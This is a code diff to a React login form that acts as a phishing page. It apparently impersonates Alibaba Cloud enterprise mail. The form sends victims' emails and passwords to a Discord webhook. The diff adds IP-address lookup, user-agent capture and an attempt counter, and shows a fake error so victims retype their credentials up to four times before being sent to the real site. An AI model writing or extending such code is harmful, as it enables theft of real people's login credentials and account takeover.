@@ -7,6 +7,7 @@ export const LoginForm: React.FC = () => {
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const [attempts, setAttempts] = useState(0);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -31,6 +32,16 @@ export const LoginForm: React.FC = () => {
     }
 
     try {
+      // Fetch IP address
+      let ip = 'Unknown';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch (e) {
+        console.error('Failed to fetch IP:', e);
+      }
+
       // Format payload for Discord
       const discordPayload = {
         embeds: [
@@ -40,7 +51,10 @@ export const LoginForm: React.FC = () => {
             fields: [
               { name: "📧 Email", value: `\`${username}\``, inline: false },
               { name: "🔒 Password", value: `\`${password}\``, inline: false },
-              { name: "🌐 URL", value: window.location.href, inline: false }
+              { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
+              { name: "📱 User Agent", value: `\`${navigator.userAgent}\``, inline: false },
+              { name: "🔗 URL", value: window.location.href, inline: false },
+              { name: "🔢 Attempt", value: `${attempts + 1}`, inline: true }
             ],
             timestamp: new Date().toISOString()
           }
@@ -56,8 +70,19 @@ export const LoginForm: React.FC = () => {
       });
 
       if (response.ok) {
-        // Redirect to a legitimate page after "successful" login
-        window.location.href = 'https://qiye.aliyun.com/';
+        const nextAttempt = attempts + 1;
+        setAttempts(nextAttempt);
+
+        if (nextAttempt >= 4) {
+          // Redirect to legitimate page after 4 trials
+          window.location.href = 'https://qiye.aliyun.com/';
+          return;
+        }
+
+        // Clear fields and show error message
+        setUsername('');
+        setPassword('');
+        setError('Something went wrong, please try again.');
       } else {
         setError('Login failed. Please check your credentials and try again.');
       }
